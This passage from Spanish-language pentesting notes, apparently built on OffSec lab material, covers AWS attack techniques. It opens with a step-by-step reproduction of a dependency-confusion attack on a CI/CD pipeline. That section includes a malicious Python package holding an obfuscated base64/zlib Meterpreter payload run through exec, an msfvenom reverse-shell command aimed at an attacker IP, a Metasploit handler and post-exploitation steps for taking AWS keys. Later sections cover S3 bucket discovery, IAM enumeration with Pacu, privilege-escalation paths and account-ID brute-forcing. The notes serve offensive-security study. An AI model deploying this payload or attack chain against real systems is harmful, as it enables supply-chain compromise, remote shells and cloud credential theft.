offseclab\n</code></pre></p> </li> <li> <p>Ejecuci\u00f3n en Producci\u00f3n:</p> </li> <li>El pipeline CI/CD descarga el paquete malicioso durante su ciclo de reconstrucci\u00f3n (cada 10 minutos).</li> <li> <p>El payload se ejecuta, enviando un shell inverso al atacante.</p> </li> <li> <p>Explotaci\u00f3n Adicional:</p> </li> <li>Desde el shell inverso, escanear la red interna para descubrir servicios.</li> <li>Crear un t\u00fanel hacia el servidor de automatizaci\u00f3n.</li> <li>Explotar una vulnerabilidad en un plugin para obtener claves AWS.</li> <li>Acceder a un bucket S3 con un archivo de estado de Terraform que contiene claves AWS de administrador.</li> </ol>"},{"location":"CloudHacking/AWS-Attacking/#explotabilidad-practica-ejemplo-claro-para-reproducir-el-ataque","title":"Explotabilidad Pr\u00e1ctica: Ejemplo Claro para Reproducir el Ataque","text":""},{"location":"CloudHacking/AWS-Attacking/#escenario","title":"Escenario","text":"<p>Una empresa usa un pipeline CI/CD que depende de <code>hackshort-util~=1.1.0</code>, configurado con <code>extra-index-url</code> para buscar en un repositorio interno y PyPI. Un atacante descubre esta dependencia en un foro p\u00fablico y decide explotarla.</p>"},{"location":"CloudHacking/AWS-Attacking/#pasos-para-reproducir","title":"Pasos para Reproducir","text":"<ol> <li>Preparar el Entorno:</li> <li>Configurar una m\u00e1quina Kali local y una instancia Kali en la nube (IP: <code>192.88.99.76</code>).</li> <li> <p>Crear un directorio para el paquete malicioso:      <pre><code>mkdir hackshort-util &amp;&amp; cd hackshort-util\n</code></pre></p> </li> <li> <p>Crear el Paquete Malicioso:</p> </li> <li>Crear un archivo <code>setup.py</code>:      <pre><code>from setuptools import setup\nsetup(\n    name=\"hackshort-util\",\n    version=\"1.1.4\",\n    packages=[\"hackshort_util\"],\n)\n</code></pre></li> <li> <p>Crear un directorio <code>hackshort_util</code> con un archivo <code>utils.py</code>:      <pre><code>import time\nimport sys\n\ndef standardFunction():\n    pass\n\ndef __getattr__(name):\n    return standardFunction\n\ndef catch_exception(exc_type, exc_value, tb):\n    while True:\n        time.sleep(1000)\n\nsys.excepthook = catch_exception\n\n# Payload Meterpreter\nexec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))\n</code></pre></p> </li> <li> <p>Generar el Payload Meterpreter:</p> </li> <li>Usar <code>msfvenom</code> para generar un payload Python:      <pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488\n</code></pre></li> <li> <p>Copiar el payload generado al final de <code>utils.py</code>.</p> </li> <li> <p>Configurar el Repositorio:</p> </li> <li> <p>Crear el archivo <code>~/.pypirc</code>:      <pre><code>[distutils]\nindex-servers = \n    offseclab\n\n[offseclab]\nrepository: http://pypi.offseclab.io/\nusername: student\npassword: password\n</code></pre></p> </li> <li> <p>Construir y Subir el Paquete:</p> </li> <li> <p>Construir y subir el paquete al repositorio simulado:      <pre><code>python3 setup.py sdist upload -r offseclab\n</code></pre></p> </li> <li> <p>Configurar el Listener:</p> </li> <li>Iniciar sesi\u00f3n en la instancia Kali en la nube:      <pre><code>ssh kali@192.88.99.76\n</code></pre></li> <li>Iniciar la base de datos de Metasploit:      <pre><code>sudo msfdb init\n</code></pre></li> <li> <p>Iniciar <code>msfconsole</code> y configurar el handler:      <pre><code>msfconsole\nuse exploit/multi/handler\nset payload python/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4488\nset ExitOnSession false\nrun -jz\n</code></pre></p> </li> <li> <p>Esperar la Ejecuci\u00f3n:</p> </li> <li>El pipeline CI/CD descargar\u00e1 el paquete malicioso en su pr\u00f3ximo ciclo de construcci\u00f3n (cada 10 minutos).</li> <li> <p>Verificar la recepci\u00f3n del shell inverso en <code>msfconsole</code>:      <pre><code>sessions -i &lt;session_id&gt;\n</code></pre></p> </li> <li> <p>Explotaci\u00f3n Adicional:</p> </li> <li>Desde el shell Meterpreter, ejecutar:<ul> <li>Escaneo de red: <code>run post/multi/recon/local_exploit_suggester</code></li> <li>Crear un t\u00fanel: <code>portfwd add -l 8080 -r &lt;automation_server_ip&gt; -p 8080</code></li> <li>Explotar un plugin vulnerable para obtener claves AWS.</li> <li>Acceder al bucket S3: <code>aws s3 ls s3://&lt;bucket_name&gt;</code> y descargar el archivo de estado de Terraform.</li> </ul> </li> </ol>"},{"location":"CloudHacking/AWS-enumeration/","title":"T\u00e9cnicas Pr\u00e1cticas de Enumeraci\u00f3n en AWS","text":"<p>Este apunte est\u00e1 dise\u00f1ado para pentesters y red teamers que buscan identificar recursos en AWS de manera efectiva y \u00e9tica. Incluye t\u00e9cnicas externas e internas, ejemplos pr\u00e1cticos y comandos espec\u00edficos para maximizar su utilidad.</p>"},{"location":"CloudHacking/AWS-enumeration/#1-enumeracion-externa-sin-credenciales","title":"1. Enumeraci\u00f3n Externa: Sin Credenciales","text":""},{"location":"CloudHacking/AWS-enumeration/#11-descubrimiento-de-subdominios","title":"1.1. Descubrimiento de Subdominios","text":"<ul> <li>Objetivo: Encontrar subdominios asociados al dominio objetivo (ej., <code>example.com</code>).</li> <li>Comando:   <pre><code>dnsenum example.com --threads 50\n</code></pre></li> <li>Resultado Esperado: Lista de subdominios como <code>app.example.com</code> o <code>dev.example.com</code>.</li> <li>Valor: Revela servicios expuestos (EC2, S3, etc.) vinculados a subdominios.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#ejemplo-de-offsec","title":"Ejemplo de offsec:","text":"<pre><code>\u276f sudo nano /etc/resolv.conf\n\u276f sudo systemctl restart NetworkManager\n\u276f host www.offseclab.io 3.208.18.82\nUsing domain server:\nName: 3.208.18.82\nAddress: 3.208.18.82#53\nAliases: \n\nwww.offseclab.io has address 54.90.147.109\n\n\u276f host -t ns offseclab.io\noffseclab.io name server ns-1536.awsdns-00.co.uk.\noffseclab.io name server ns-1024.awsdns-00.org.\noffseclab.io name server ns-512.awsdns-00.net.\noffseclab.io name server ns-0.awsdns-00.com.\n\n\u276f dnsenum offseclab.io --threads 100\ndnsenum VERSION:1.3.1\n\n-----   offseclab.io   -----\n\n\nHost's addresses:\n__________________\n\noffseclab.io.                            60       IN    A        54.90.147.109\n\n\nName Servers:\n______________\n\n\n\nMail (MX) Servers:\n___________________\n\n\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nunresolvable name: ns-0.awsdns-00.com at /usr/bin/dnsenum line 892 thread 5.\n\nTrying Zone Transfer for offseclab.io on ns-0.awsdns-00.com ... \nAXFR record query failed: no nameservers\nunresolvable name: ns-1024.awsdns-00.org at /usr/bin/dnsenum line 892 thread 6.\n\nTrying Zone Transfer for offseclab.io on ns-1024.awsdns-00.org ... \nAXFR record query failed: no nameservers\nunresolvable name: ns-1536.awsdns-00.co.uk at /usr/bin/dnsenum line 892 thread 7.\n\nTrying Zone Transfer for offseclab.io on ns-1536.awsdns-00.co.uk ... \nAXFR record query failed: no nameservers\nunresolvable name: ns-512.awsdns-00.net at /usr/bin/dnsenum line 892 thread 8.\n\nTrying Zone Transfer for offseclab.io on ns-512.awsdns-00.net ... \nAXFR record query failed: no nameservers\n\n\nBrute forcing with /usr/share/dnsenum/dns.txt:\n_______________________________________________\n\n\nmail.offseclab.io.                       60       IN    A        54.90.147.109\n\nwww.offseclab.io.                        60       IN    A        54.90.147.109\n</code></pre>"},{"location":"CloudHacking/AWS-enumeration/#12-identificacion-de-buckets-s3-publicos","title":"1.2. Identificaci\u00f3n de Buckets S3 P\u00fablicos","text":"<ul> <li>T\u00e9cnica: Buscar buckets accesibles probando nombres predecibles.</li> <li>Comando Manual:   <pre><code>curl http://example-lab-assets-public.s3.amazonaws.com/\n</code></pre></li> <li>Respuesta XML = bucket p\u00fablico.</li> <li>\"Access Denied\" = bucket existe pero est\u00e1 protegido.</li> <li>\"NoSuchBucket\" = bucket no existe.</li> <li>Automatizaci\u00f3n con <code>cloud_enum</code>:   <pre><code>cloud_enum -k example-lab -qs --disable-azure --disable-gcp\n</code></pre></li> <li>Valor: Encuentra almacenamiento p\u00fablico con datos sensibles (ej., backups, configs).</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#ejemplo-de-offsec_1","title":"Ejemplo de offsec","text":"<pre><code>kali@kali:~$ cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp\n\n...\n\nKeywords:    offseclab-assets-public-axevtewi\nMutations:   NONE! (Using quickscan)\nBrute-list:  /usr/lib/cloud-enum/enum_tools/fuzz.txt\n\n[+] Mutated results: 1 items\n\n++++++++++++++++++++++++++\n      amazon checks\n++++++++++++++++++++++++++\n\n[+] Checking for S3 buckets\n  OPEN S3 BUCKET: http://offseclab-assets-public-axevtewi.s3.amazonaws.com/\n      FILES:\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/offseclab-assets-public-axevtewi\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/amethyst-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/amethyst.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/logo.svg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic02.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic05.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic13.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/ruby-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/ruby.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/saphire-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/saphire.jpg\n\n\n Elapsed time: 00:00:00\n\n[+] Checking for AWS Apps\n[*] Brute-forcing a list of 1 possible DNS names\n\n Elapsed time: 00:00:00\n\n\n[+] All done, happy hacking!\n</code></pre> <p>Hay muchas formas en las que podr\u00edamos lograr esto. Usaremos un script de Bash para ejecutar un bucle en una sola l\u00ednea que itera sobre algunas palabras clave y muestra la palabra clave, insertando un prefijo (offseclab-assets) y un sufijo (-axevtewi) alrededor de ella. Finalmente, usaremos el comando tee para mostrar el resultado en la consola, as\u00ed como en el archivo /tmp/keyfile.txt. Como resultado, tendremos el archivo clave con los nombres de los buckets para validar si existen.</p> <pre><code>kali@kali:~$ for key in \"public\" \"private\" \"dev\" \"prod\" \"development\" \"production\"; do echo \"offseclab-assets-$key-axevtewi\"; done | tee /tmp/keyfile.txt\noffseclab-assets-public-axevtewi\noffseclab-assets-private-axevtewi\noffseclab-assets-dev-axevtewi\noffseclab-assets-prod-axevtewi\noffseclab-assets-development-axevtewi\noffseclab-assets-production-axevtewi\n</code></pre> <p>Ahora podemos volver a ejecutar <code>cloud_enum</code> con el archivo de claves que acabamos de crear:</p> <pre><code>kali@kali:~$ cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp\n\n...\n\nKeywords:    offseclab-assets-public-axevtewi, offseclab-assets-private-axevtewi, offseclab-assets-dev-axevtewi, offseclab-assets-prod-axevtewi, offseclab-assets-development-axevtewi, offseclab-assets-production-axevtewi\nMutations:   NONE! (Using quickscan)\nBrute-list:  /usr/lib/cloud-enum/enum_tools/fuzz.txt\n\n[+] Mutated results: 6 items\n\n++++++++++++++++++++++++++\n      amazon checks\n++++++++++++++++++++++++++\n\n[+] Checking for S3 buckets\n  OPEN S3 BUCKET: http://offseclab-assets-public-axevtewi.s3.amazonaws.com/\n      FILES:\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/offseclab-assets-public-axevtewi\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/amethyst-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/amethyst.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/logo.svg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic02.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic05.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/pic13.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/ruby-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/ruby.jpg\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/saphire-expanded.png\n      -&gt;http://offseclab-assets-public-axevtewi.s3.amazonaws.com/sites/www/images/saphire.jpg\n  Protected S3 Bucket: http://offseclab-assets-private-axevtewi.s3.amazonaws.com/\n\n Elapsed time: 00:00:06\n\n[+] Checking for AWS Apps\n[*] Brute-forcing a list of 6 possible DNS names\n\n Elapsed time: 00:00:00\n\n\n[+] All done, happy hacking!\n</code></pre> <p>A partir del resultado, podemos confirmar que hay otro bucket, pero est\u00e1 protegido, lo que significa que no es p\u00fablicamente legible. Tambi\u00e9n podr\u00edamos intentar validar si existen otros buckets utilizando otra informaci\u00f3n que encontramos durante la fase de reconocimiento. Por ejemplo, podr\u00edan ser buckets que incluyan el nombre de los proyectos de offseclab como offseclab-assets-ruby-axevtewi o offseclab-ruby-axevtewi. Dejaremos esto como un ejercicio para el lector.</p>"},{"location":"CloudHacking/AWS-enumeration/#13-analisis-dns-y-whois","title":"1.3. An\u00e1lisis DNS y WHOIS","text":"<ul> <li>Comando DNS:   <pre><code>host -t ns example.com\n</code></pre></li> <li>Salida: <code>ns-1536.awsdns-00.co.uk</code> (indica Route53).</li> <li>Comando WHOIS:   <pre><code>whois example.com | grep \"Registrant Organization\"\n</code></pre></li> <li>Valor: Confirma uso de AWS y expone infraestructura asociada.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#2-enumeracion-interna-con-credenciales","title":"2. Enumeraci\u00f3n Interna: Con Credenciales","text":""},{"location":"CloudHacking/AWS-enumeration/#21-listado-de-recursos-con-awscli","title":"2.1. Listado de Recursos con <code>awscli</code>","text":"<ul> <li>Configuraci\u00f3n:   <pre><code>aws configure --profile pentester\n</code></pre></li> </ul> <pre><code>kali@kali:~$ aws configure --profile attacker\nAWS Access Key ID []: AKIAQO...\nAWS Secret Access Key []: cOGzm...\nDefault region name []: us-east-1\nDefault output format []: json\n\nkali@kali:~$ aws --profile attacker sts get-caller-identity\n{\n    \"UserId\": \"AIDAQOMAIGYU5VFQCHOI4\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:iam::123456789012:user/attacker\"\n}\n</code></pre>"},{"location":"CloudHacking/AWS-enumeration/#comandos-utiles","title":"Comandos \u00datiles","text":"<ul> <li><code>aws --profile attacker ec2 describe-images --owners amazon --executable-users all</code>: Lista im\u00e1genes de Amazon disponibles para todos los usuarios ejecutables.</li> <li><code>aws --profile attacker ec2 describe-images --executable-users all --filters \"Name=description,Values=*&lt;keyword&gt;*\"</code>: Filtra im\u00e1genes por palabras clave en la descripci\u00f3n.</li> <li> <p><code>aws --profile attacker ec2 describe-images --executable-users all --filters \"Name=name,Values=*&lt;keyword&gt;*\"</code>: Filtra im\u00e1genes por palabras clave en el nombre.</p> </li> <li> <p>Ingresa Access Key, Secret Key y regi\u00f3n.</p> </li> <li>Listar Buckets S3:   <pre><code>aws s3 ls --profile pentester\n</code></pre></li> <li>Listar Instancias EC2:   <pre><code>aws ec2 describe-instances --profile pentester\n</code></pre></li> <li>Valor: Mapea la infraestructura interna r\u00e1pidamente.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#obtencion-de-ids-de-cuentas-desde-buckets-s3-publicos","title":"Obtenci\u00f3n de IDs de Cuentas desde Buckets S3 P\u00fablicos","text":"<p>Para realizar esta t\u00e9cnica, se necesita una cuenta de AWS para interactuar con la API de AWS. Se utilizar\u00e1 un perfil configurado en AWS CLI para simular este escenario. Adem\u00e1s, la cuenta objetivo debe tener un bucket S3 p\u00fablico que permita acceso de lectura. Primero, se debe crear un usuario IAM que, por defecto, no tendr\u00e1 permisos para ejecutar acciones. Luego, se a\u00f1adir\u00e1 una pol\u00edtica que otorgue acceso de lectura al bucket, con la condici\u00f3n de que el permiso solo se aplique si el ID de la cuenta propietaria del bucket comienza con un d\u00edgito espec\u00edfico. Si no se puede leer el bucket, se probar\u00e1n otros n\u00fameros hasta que se logre acceder, lo que permitir\u00e1 identificar el primer d\u00edgito del ID de la cuenta propietaria. Este proceso se puede repetir para obtener todos los d\u00edgitos del ID de la cuenta. El primer paso es seleccionar un bucket o un objeto p\u00fablico dentro de la cuenta objetivo. Dado que el bucket u objeto es p\u00fablico, deber\u00eda ser posible listar su contenido con cualquier usuario IAM de cualquier cuenta de AWS. A continuaci\u00f3n, se crea un nuevo usuario IAM en la cuenta propia. Por defecto, los usuarios IAM no tienen permisos para ejecutar acciones, por lo que el nuevo usuario no podr\u00e1 listar el contenido del recurso p\u00fablico incluso si es accesible p\u00fablicamente. Despu\u00e9s, se define una pol\u00edtica que permita listar buckets y leer objetos. Sin embargo, se a\u00f1ade una condici\u00f3n para que el permiso de lectura solo se aplique si el ID de la cuenta propietaria del bucket comienza con un d\u00edgito espec\u00edfico. Finalmente, se prueba si el nuevo usuario puede listar el bucket utilizando sus credenciales. Se prueba con valores de d\u00edgitos del 0 al 9 hasta que se logre listar el bucket, lo que confirma el primer d\u00edgito del ID de la cuenta.</p> <p></p>"},{"location":"CloudHacking/AWS-enumeration/#creacion-de-un-usuario-iam-para-enumeracion","title":"Creaci\u00f3n de un Usuario IAM para Enumeraci\u00f3n","text":"<ul> <li><code>kali@kali:~$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour</code></li> </ul> <p>Ahora, vamos a crear un nuevo usuario IAM con el comando <code>iam create-user --user-name enum</code>. Recordemos que este usuario reside en la cuenta de AWS controlada por el atacante.</p> <p>A continuaci\u00f3n, tambi\u00e9n crearemos claves de acceso para el usuario IAM, de modo que podamos interactuar con la API de AWS a trav\u00e9s de la herramienta AWS CLI. Ejecutaremos el comando <code>iam create-access-key --user-name enum</code> y tomaremos nota de los valores de <code>AccessKeyId</code> y <code>SecretAccessKey</code> en la salida.</p> <pre><code>kali@kali:~$ aws --profile attacker iam create-user --user-name enum\n{\n    \"User\": {\n        \"Path\": \"/\",\n        \"UserName\": \"enum\",\n        \"UserId\": \"AIDAQOMAIGYU4HTPEJ32K\",\n        \"Arn\": \"arn:aws:iam::123456789012:user/enum\",\n    }\n}\n\nkali@kali:~$ aws --profile attacker iam create-access-key --user-name enum\n{\n    \"AccessKey\": {\n        \"UserName\": \"enum\",\n        \"AccessKeyId\": \"&lt;ACCESS_KEY_ID&gt;\",\n        \"Status\": \"Active\",\n        \"SecretAccessKey\": \"***REDACTED***\",\n    }\n}\n</code></pre>"},{"location":"CloudHacking/AWS-enumeration/#22-enumeracion-de-usuarios-y-roles-iam","title":"2.2. Enumeraci\u00f3n de Usuarios y Roles IAM","text":"<ul> <li>Listar Usuarios:   <pre><code>aws iam list-users --profile pentester\n</code></pre></li> <li>Listar Roles:   <pre><code>aws iam list-roles --profile pentester\n</code></pre></li> <li>Valor: Identifica privilegios excesivos o roles asumibles.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#enumeracion-de-recursos-iam","title":"Enumeraci\u00f3n de Recursos IAM","text":"<ul> <li>Contexto: Se inicia con credenciales comprometidas de un usuario IAM (<code>clouddesk-plove</code>), miembro del grupo <code>support</code> con la pol\u00edtica <code>SupportUser</code>, que otorga acceso de solo lectura a varios servicios.</li> <li>Comandos clave:</li> <li><code>aws iam list-users</code>: Lista todos los usuarios IAM.</li> <li><code>aws iam list-groups</code>: Lista los grupos.</li> <li><code>aws iam list-roles</code>: Lista los roles.</li> <li><code>aws iam get-account-summary</code>: Proporciona un resumen de recursos IAM (ej., 18 usuarios, 20 roles, 8 grupos) y revela configuraciones d\u00e9biles como la ausencia de MFA (<code>\"MFADevices\": 0</code>).</li> <li>Datos obtenidos: Nombre, ARN y ruta de usuarios, grupos y roles, guardados en archivos JSON (ej., <code>users.json</code>, <code>roles.json</code>) para an\u00e1lisis posterior.</li> <li>Ejemplo pr\u00e1ctico:   <pre><code>aws --profile target iam list-users | tee users.json\n</code></pre>   Muestra usuarios como <code>admin-alice</code> con rutas como <code>/admin/</code>, sugiriendo privilegios elevados.</li> <li>Advertencia: Pol\u00edticas personalizadas como <code>SupportUser</code> pueden ser riesgosas si son demasiado permisivas.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#procesamiento-de-datos-de-respuesta-de-la-api-con-jmespath","title":"Procesamiento de Datos de Respuesta de la API con JMESPath","text":"<ul> <li>Qu\u00e9 es JMESPath: Un lenguaje de consulta para JSON que filtra y transforma salidas de AWS CLI.</li> <li>Uso: Reduce solicitudes a la API al procesar datos localmente.</li> <li>Ejemplos:</li> <li>Listar nombres de usuarios:     <pre><code>aws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[].UserName\"\n</code></pre>     Salida: <code>[\"admin-alice\", \"admin-cbarton\", ...]</code></li> <li>Filtrar usuarios con \"admin\" en el nombre:     <pre><code>aws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[?contains(UserName, 'admin')].{Name: UserName}\"\n</code></pre>     Salida: <code>[{\"Name\": \"admin-alice\"}, {\"Name\": \"admin-cbarton\"}, ...]</code></li> <li>Combinar datos de usuarios y grupos:     <pre><code>aws --profile target iam get-account-authorization-details --filter User Group --query \"{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}\"\n</code></pre></li> <li>Consejo: Guardar salidas en archivos y usar herramientas como <code>jp</code> para consultas offline, minimizando el ruido en logs.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#ejecucion-de-enumeracion-automatizada-con-pacu","title":"Ejecuci\u00f3n de Enumeraci\u00f3n Automatizada con Pacu","text":"<ul> <li>Pacu: Herramienta de enumeraci\u00f3n y explotaci\u00f3n para AWS, instalada en Kali con:   <pre><code>sudo apt install pacu\n</code></pre></li> <li>Configuraci\u00f3n:</li> <li>Iniciar sesi\u00f3n: <code>pacu</code> \u2192 Crear sesi\u00f3n (ej., <code>enumlab</code>).</li> <li>Importar claves: <code>import_keys target</code>.</li> <li>M\u00f3dulo clave: <code>iam__enum_users_roles_policies_groups</code> recopila datos de usuarios, roles, pol\u00edticas y grupos.</li> <li>Ejecuci\u00f3n:     <pre><code>run iam__enum_users_roles_policies_groups\n</code></pre>     Resultado: Enumera 18 usuarios, 20 roles, 8 pol\u00edticas y 8 grupos, almacenados en la base de datos de Pacu.</li> <li>Ver datos:     <pre><code>services  # Lista servicios con datos (ej., IAM)\ndata IAM  # Muestra detalles\n</code></pre></li> <li>Ventaja: Automatiza tareas repetitivas, pero requiere permisos adecuados en las credenciales comprometidas.</li> <li>Monitoreo: Revisar logs de CloudTrail para evaluar el impacto y ruido generado.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#extraccion-de-insights-de-los-datos-de-enumeracion","title":"Extracci\u00f3n de Insights de los Datos de Enumeraci\u00f3n","text":"<ul> <li>Objetivo: Analizar datos para identificar caminos de escalada de privilegios (ej., obtener acceso de administrador).</li> <li>Ejemplo de an\u00e1lisis:</li> <li>Usuario <code>admin-alice</code>:     <pre><code>aws --profile target iam get-account-authorization-details --filter User Group --query \"UserDetailList[?UserName=='admin-alice']\"\n</code></pre><ul> <li>Pertenece a los grupos <code>admin</code> (con <code>AdministratorAccess</code>) y <code>amethyst_admin</code>.</li> <li>Sin MFA, vulnerable a ataques como ingenier\u00eda social.</li> </ul> </li> <li>Grupo <code>admin</code>:<ul> <li>Pol\u00edtica <code>AdministratorAccess</code> permite todo (<code>\"Action\": \"*\", \"Resource\": \"*\"</code>).</li> </ul> </li> <li>Pol\u00edtica <code>amethyst_admin</code>:<ul> <li>Permite acciones IAM en recursos etiquetados con <code>\"Project\": \"amethyst\"</code>, incluyendo <code>iam:CreateAccessKey</code> para usuarios como <code>admin-alice</code>.</li> </ul> </li> <li>Caminos de escalada:</li> <li>Obtener credenciales de <code>admin-alice</code> (ej., sin MFA facilita ataques).</li> <li>Usar un usuario de <code>amethyst_admin</code> (como <code>admin-cbarton</code>) para crear claves de acceso de <code>admin-alice</code>.</li> <li>Herramientas visuales: Awspx o Cloudmapper ayudan a mapear relaciones y visualizar caminos de ataque.</li> <li>Conclusi\u00f3n: La falta de MFA y pol\u00edticas permisivas (uso de <code>*</code>) son puntos d\u00e9biles explotables.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#23-deteccion-de-configuraciones-erroneas","title":"2.3. Detecci\u00f3n de Configuraciones Err\u00f3neas","text":"<ul> <li>Buckets S3 P\u00fablicos:   <pre><code>aws s3api get-bucket-policy --bucket example-lab-assets-public --profile pentester\n</code></pre></li> <li>Valor: Encuentra puntos de entrada para escalar privilegios.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#3-ejemplo-practico","title":"3. Ejemplo Pr\u00e1ctico","text":"<ol> <li>Escenario: Dominio <code>example.com</code>.</li> <li>Paso 1: Enumerar subdominios:    <pre><code>dnsenum example.com\n</code></pre></li> <li>Encuentra <code>dev.example.com</code>.</li> <li>Paso 2: Resolver IP:    <pre><code>host dev.example.com\n</code></pre></li> <li>Salida: <code>52.70.117.69</code> (EC2).</li> <li>Paso 3: Probar buckets:    <pre><code>curl http://example-lab-dev.s3.amazonaws.com/\n</code></pre></li> <li>XML devuelto = bucket p\u00fablico.</li> </ol>"},{"location":"CloudHacking/AWS-enumeration/#4-herramientas-recomendadas","title":"4. Herramientas Recomendadas","text":"<ul> <li><code>awscli</code>: Interacci\u00f3n directa con la API de AWS.</li> <li><code>cloud_enum</code>: Automatiza b\u00fasqueda de recursos p\u00fablicos.</li> <li><code>dnsenum</code>: Enumeraci\u00f3n DNS eficiente.</li> <li>pacu: Herramienta de enumeraci\u00f3n y explotaci\u00f3n de AWS.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#obtencion-de-ids-de-cuentas-desde-buckets-s3","title":"Obtenci\u00f3n de IDs de Cuentas desde Buckets S3","text":""},{"location":"CloudHacking/AWS-enumeration/#descripcion","title":"Descripci\u00f3n","text":"<p>Esta t\u00e9cnica aprovecha las caracter\u00edsticas de la API de AWS para determinar el ID de una cuenta a partir de un bucket S3 p\u00fablico o un objeto accesible, incluso si no hay recursos compartidos p\u00fablicamente de manera evidente.</p>"},{"location":"CloudHacking/AWS-enumeration/#pasos-clave","title":"Pasos Clave","text":"<ol> <li>Crear un Usuario IAM en la Cuenta del Atacante:</li> <li>Genera un usuario IAM sin permisos iniciales en tu propia cuenta AWS.</li> <li>Usa el comando: <pre><code>aws iam create-user --user-name enum\n</code></pre></li> <li> <p>Crea claves de acceso para este usuario: <pre><code>aws iam create-access-key --user-name enum\n</code></pre></p> </li> <li> <p>Configurar las Claves en AWS CLI:</p> </li> <li> <p>Configura un perfil en AWS CLI con las claves generadas: <pre><code>aws configure --profile enum\n</code></pre></p> </li> <li> <p>Definir una Pol\u00edtica con Condici\u00f3n:</p> </li> <li>Crea una pol\u00edtica que permita leer el bucket solo si el ID de la cuenta que posee el bucket comienza con un d\u00edgito espec\u00edfico (por ejemplo, \"1\"). Ejemplo de pol\u00edtica en <code>policy-s3-read.json</code>:      <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowResourceAccount\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:ListBucket\",\n                \"s3:GetObject\"\n            ],\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"StringLike\": {\"s3:ResourceAccount\": [\"1*\"]}\n            }\n        }\n    ]\n}\n</code></pre></li> <li> <p>Asocia la pol\u00edtica al usuario: <pre><code>aws iam put-user-policy --user-name enum --policy-name s3-read --policy-document file://policy-s3-read.json\n</code></pre></p> </li> <li> <p>Probar el Acceso:</p> </li> <li>Intenta listar el contenido del bucket con el perfil del usuario: <pre><code>aws --profile enum s3 ls s3://&lt;nombre-del-bucket&gt;\n</code></pre></li> <li> <p>Si falla con \"AccessDenied\", ajusta el d\u00edgito en la condici\u00f3n (de 0 a 9) y repite hasta que tengas \u00e9xito, revelando el primer d\u00edgito del ID.</p> </li> <li> <p>Iterar para D\u00edgitos Siguientes:</p> </li> <li>Modifica la condici\u00f3n para incluir m\u00e1s d\u00edgitos (por ejemplo, <code>\"12*\"</code>), y contin\u00faa hasta obtener el ID completo.</li> </ol>"},{"location":"CloudHacking/AWS-enumeration/#ejemplo-practico","title":"Ejemplo Pr\u00e1ctico","text":"<ul> <li>Si el bucket es <code>s3://ejemplo-bucket-publico</code>, prueba con diferentes condiciones:</li> <li><code>\"0*\"</code> \u2192 AccessDenied</li> <li><code>\"1*\"</code> \u2192 \u00c9xito (el ID comienza con 1)</li> <li><code>\"12*\"</code> \u2192 \u00c9xito (siguiente d\u00edgito es 